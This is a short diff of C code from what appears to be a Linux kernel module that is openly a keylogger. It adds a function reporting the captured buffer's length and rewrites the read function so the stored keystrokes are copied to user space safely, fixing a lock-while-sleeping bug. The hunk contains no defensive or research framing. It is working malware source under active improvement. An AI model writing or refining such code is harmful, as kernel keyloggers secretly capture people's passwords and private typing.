@@ -84,18 +84,43 @@ void keylogger_cleanup(void) {
     pr_info(VAULT_KERNEL_TAG " keylogger cleaned\n");
 }
 
-int keylogger_read(char __user *buf, size_t count) {
+size_t keylogger_len(void) {
     unsigned long flags;
     size_t len;
 
     spin_lock_irqsave(&keylog_lock, flags);
-    len = keylog_pos < count ? keylog_pos : count;
-    if (copy_to_user(buf, keylog_buf, len)) {
-        spin_unlock_irqrestore(&keylog_lock, flags);
-        return -EFAULT;
-    }
+    len = keylog_pos;
     spin_unlock_irqrestore(&keylog_lock, flags);
     return len;
+}
+
+int keylogger_read(char __user *buf, size_t count) {
+    unsigned long flags;
+    size_t len;
+    char *snapshot;
+
+    /*
+     * copy_to_user() may fault and sleep, so it must NEVER run
+     * under a spinlock.  Snapshot the buffer first, then copy to
+     * userland with the lock released.
+     */
+    spin_lock_irqsave(&keylog_lock, flags);
+    len = keylog_pos < count ? keylog_pos : count;
+    snapshot = kmalloc(len ? len : 1, GFP_ATOMIC);
+    if (snapshot)
+        memcpy(snapshot, keylog_buf, len);
+    spin_unlock_irqrestore(&keylog_lock, flags);
+
+    if (!snapshot)
+        return -ENOMEM;
+
+    if (copy_to_user(buf, snapshot, len)) {
+        kfree(snapshot);
+        return -EFAULT;
+    }
+
+    kfree(snapshot);
+    return (int)len;
 }
 
 void keylogger_clear(void) {
